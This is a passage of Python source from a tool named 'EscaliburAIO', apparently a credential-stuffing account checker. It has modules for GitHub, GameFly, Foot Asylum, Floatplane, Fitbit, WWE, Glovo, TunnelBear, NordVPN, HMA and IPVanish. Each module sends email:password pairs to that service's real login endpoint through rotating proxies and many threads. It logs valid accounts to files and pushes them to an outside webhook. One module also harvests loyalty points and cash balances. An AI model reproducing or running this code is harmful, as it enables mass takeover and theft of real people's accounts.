                if "Incorrect email or password." or "Please verify your email address" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif ">Signed in as <" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                else:
                    threading.Thread(target=github_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=github_check, args=(emails, passwords, proxylist,)).start()
    def github():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Github"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=github_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def gamefly_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                url = "https://api.gamefly.com/api/account/authenticate" 

                content = {"email":email,"password":password}

                headers = {
                    "Content-Type":"application/json;charset=UTF-8", 
                    "User-Agent":"GameFly Android v7.54 (com.gamefly.android.gamecenter)", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*", 
                    "X-Device-Instance-Id":"d856780e-d59d-4cbc-8475-f4fada10f514", 
                    "X-Session-Id":"3c4376f1-463c-45cd-94f4-5045d1da8014", 
                    "X-Source":"GCAN" 
                }

                r = sess.post(url, json=content, headers=headers)

                if "requestSucceeded\":false" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "accessToken\":\"" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                else:
                    threading.Thread(target=gamefly_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=gamefly_check, args=(emails, passwords, proxylist,)).start()
    def gamefly():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="GameFly"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=gamefly_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def foot_asylum_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                url = "https://r9udv3ar7g.execute-api.eu-west-2.amazonaws.com/prod/customer/auth"
                content = {"channel_id":3,"fascia_id":1,"customer":{"email":email,"customer_id":"","password":password}}

                headers = {
                    "Content-Type":"application/json; charset=UTF-8", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*" 
                }

                r = sess.post(url, json=content, headers=headers)
                if "title\"\":\"\"Invalid user name / password" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "customer_id\"\":\"\"" in r.text:
                    customerid = search(r'customer_id\"":"\"(.*?)\",', str(r.text)).group(1)
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    url = "http://apiv2.asylumapi.com/api/v1/unlockd/profile/fromid" 
                    content = {"id":customerid}
                    headers = {
                        "Content-Type":"application/json; charset=UTF-8", 
                        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                        "Pragma":"no-cache", 
                        "Accept":"*/*" 
                    }
                    f = sess.post(url, json=content, headers=headers)
                    points = search(r'points\":\"(.*?)\",\"cash\":\"', str(f.text)).group(1)
                    cashrewards = search(r'cash\":\"(.*?)\",\"eligible', str(f.text)).group(1)
                    open("results/{}/capture.txt".format(today), "a+").write("{}:{} | Points: {} | Cash-Rewards: {} |\n".format(email, password, points, cashrewards))
                else:
                    threading.Thread(target=foot_asylum_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=foot_asylum_check, args=(emails, passwords, proxylist,)).start()
    def foot_asylum():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Foot-Asylum"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=foot_asylum_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def floatplane_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                url = "https://www.floatplane.com/api/auth/login" 

                content = {"username":email,"password":password}

                headers = {
                    "Content-Type":"text/plain",
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*", 
                    "scheme":"https", 
                    "accept":"application/json, text/plain, */*", 
                    "accept-encoding":"gzip, deflate, br", 
                    "accept-language":"el-GR,el;q=0.9,en;q=0.8", 
                    "content-length":"46",
                    "origin":"https://www.floatplane.com", 
                    "referer":"https://www.floatplane.com/login", 
                    "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
                }

                r = sess.post(url, json=content, headers=headers)

                if "username"  in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "Username or password is incorrect.\"}],\"" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=floatplane_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=floatplane_check, args=(emails, passwords, proxylist,)).start()
    def floatplane():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="FloatPlane"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=floatplane_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def fitbit_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                content = f"grant_type=password&client_id=2295XJ&username={email}&password={password}&scope=activity%20heartrate%20location%20nutrition%20profile%20settings%20sleep%20social%20weight&expires_in=31536000"

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "User-Agent":"NativeHost", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*" 
                }
                r = sess.get("https://android-api.fitbit.com/oauth2/token", headers=headers, data=content)
                if "access_token\":\"" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "success\":false" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=fitbit_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=fitbit_check, args=(emails, passwords, proxylist,)).start()
    def fitbit():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Fitbit"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=fitbit_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def WWE_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                headers = {
                    "Content-Type":"application/json", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                    "Pragma":"no-cache", 
                    "Accept":"application/json", 
                    "Origin":"https://watch.wwe.com", 
                    "Realm":"dce.wwe", 
                    "Referer":"https://watch.wwe.com/signin", 
                    "Sec-Fetch-Mode":"cors", 
                    "x-api-key":"cca51ea0-7837-40df-a055-75eb6347b2e7" 
                }

                content = {"id":email,"secret":password}

                r = sess.post("https://dce-frontoffice.imggaming.com/api/v2/login", headers=headers, json=content)

                if "failedAuthenticatio" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "{\"authorisationToken\":\"" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                else:
                    threading.Thread(target=WWE_check, args=(emails, passwords, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=WWE_check, args=(emails, passwords, proxylist,)).start()
    def WWE():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="WWE"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=WWE_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def Glovo_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                headers = {
                    "Host":"api.glovoapp.com",
                    "Connection":"keep-alive",
                    "Glovo-API-Version":"13",
                    "Glovo-App-Version":"7",
                    "Glovo-App-Platform":"web",
                    "Glovo-Language-Code":"en",
                    "Content-Type":"application/json",
                    "Accept":"application/json",
                    "Glovo-Location-City-Code":"WAW",
                    "Glovo-App-Type":"customer",
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",
                    "Glovo-Device-Id":"118196279",
                    "Origin":"https://glovoapp.com",
                    "Sec-Fetch-Site":"same-site",
                    "Sec-Fetch-Mode":"cors",
                    "Sec-Fetch-Dest":"empty",
                    "Accept-Language":"en-US,en;q=0.9",
                    "Accept-Encoding":"gzip, deflate",
                    "Content-Length":"78"
                }

                content = {"grantType":"password","username":email,"password":password}

                r = sess.post("https://api.glovoapp.com/oauth/token", json=content, headers=headers)
                if "Authentication failed: bad credentials" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "accessToken" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                else:
                    threading.Thread(target=Glovo_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=Glovo_check, args=(emails, passwords, proxylist,)).start()
    def Glovo():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Glovo"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=Glovo_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def TunnelBear_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                headers = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
                    "Pragma": "no-cache",
                    "Accept": "*/*",
                    "origin": "https://www.tunnelbear.com",
                    "referer": "https://www.tunnelbear.com/account/login"
                }

                data = {
                    "username": email, 
                    "password": password, 
                    "withUserDetails": "true", 
                    "v": "web-1.0"
                }
                r = sess.post("https://www.tunnelbear.com/core/api/login", data=data, headers=headers)
                if "Access denied" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))

                elif "result\":\"PASS\",\"" or "\",\"paymentStatus\":\"FREE" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))

                else:
                    threading.Thread(target=TunnelBear_check, args=(emails, passwords, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=TunnelBear_check, args=(emails, passwords, proxylist,)).start()
    def TunnelBear():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="TunnelBear"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=TunnelBear_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1
    def NordVPN_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                url = "https://zwyr157wwiu6eior.com/v1/users/tokens" 
                headers = {
                    "content-type": "application/x-www-form-urlencoded" ,
                    "User-Agent": "NordApp android (playstore/2.8.6) Android 9.0.0",
                    "Accept": "*/*",
                    "Pragma": "no-cache" 
                }
                content = f"username={email}&password={password}" 
                r = sess.post(url, headers=headers, data=content)
                if "\"Unauthorized\"" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))

                elif "\"user_id\"" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "{\"$type\":\"System.Collections.Generic.List`1[[RuriLib.BlockBase, RuriLib]], mscorlib\",\"$values\":[{\"$type\":\"RuriLib.BlockRequest, RuriLib\",\"Url\":\"https://zwyr157wwiu6eior.com/v1/users/tokens\",\"RequestType\":0,\"AuthUser\":\"\",\"AuthPass\":\"\",\"PostData\":\"username=<USER>&password=<PASS>\",\"Method\":3,\"CustomHeaders\":{\"$type\":\"System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[System.String, mscorlib]], mscorlib\",\"User-Agent\":\"NordApp android (playstore/2.8.6) Android 8.1.0\",\"Pragma\":\"no-cache\",\"Accept\":\"*/*\"},\"CustomCookies\":{\"$type\":\"System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[System.String, mscorlib]], mscorlib\"},\"ContentType\":\"application/x-www-form-urlencoded\",\"AutoRedirect\":true,\"ReadResponseSource\":true,\"ParseQuery\":false,\"EncodeContent\":false,\"AcceptEncoding\":true,\"MultipartBoundary\":\"\",\"MultipartContents\":{\"$type\":\"System.Collections.Generic.List`1[[RuriLib.MultipartContent, RuriLib]], mscorlib\",\"$values\":[]},\"ResponseType\":0,\"DownloadPath\":\"\",\"Label\":\"REQUEST\",\"Disabled\":false}]}" in r.text:
                    threading.Thread(target=NordVPN_check, args=(emails, passwords, proxylist,)).start()
                else:
                    threading.Thread(target=NordVPN_check, args=(emails, passwords, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=NordVPN_check, args=(emails, passwords, proxylist,)).start()
    def NordVPN():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="NordVPN"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=NordVPN_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1
    def HMA():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="HMA"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=HMA_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1
    def HMA_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                url = "https://securenetconnection.com/clapi/v1.5/user/login" 
                content = f"username={email}&password={password}" 
                headers = {
                    "content-type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
                    "Pragma": "no-cache",
                    "Accept": "*/*" 
                }
                r = sess.post(url, headers=headers, data=content)
                if "{\"status\":{\"code\":257,\"msg\":\"Invalid username/password combination\"}}" in r.text:
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    bad+=1
                    cpm+=1
                    checked+=1
                elif "\"plan\":\"12 Months\""  in r.text:
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    good+=1
                    cpm+=1
                    checked+=1
                elif "\"plan\":\"6 Months\""  in r.text:
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    good+=1
                    cpm+=1
                    checked+=1
                elif "Error has occurred"  in r.text:
                    threading.Thread(target=HMA_check, args=(emails, passwords, proxylist,)).start()
                elif "\"plan\":\"\""  in r.text:
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))

                    good+=1
                    cpm+=1
                    checked+=1
                else:
                    threading.Thread(target=HMA_check, args=(emails, passwords, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=HMA_check, args=(emails, passwords, proxylist,)).start()

    def IpVanish_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                content = f"clientToken=1062da8e70c0053cf9c443626f93f271fa517cb7e173e3dbb207263570f2c234&username={email}&password={password}" 
                headers = {
                    "Host":"account.ipvanish.com",
                    "Connection":"keep-alive",
                    "Cache-Control":"max-age=0",
                    "Upgrade-Insecure-Requests":"1",
                    "Origin":"https://account.ipvanish.com",
                    "Content-Type":"application/x-www-form-urlencoded",
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36",
                    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Sec-Fetch-Site":"same-origin",
                    "Sec-Fetch-Mode":"navigate",
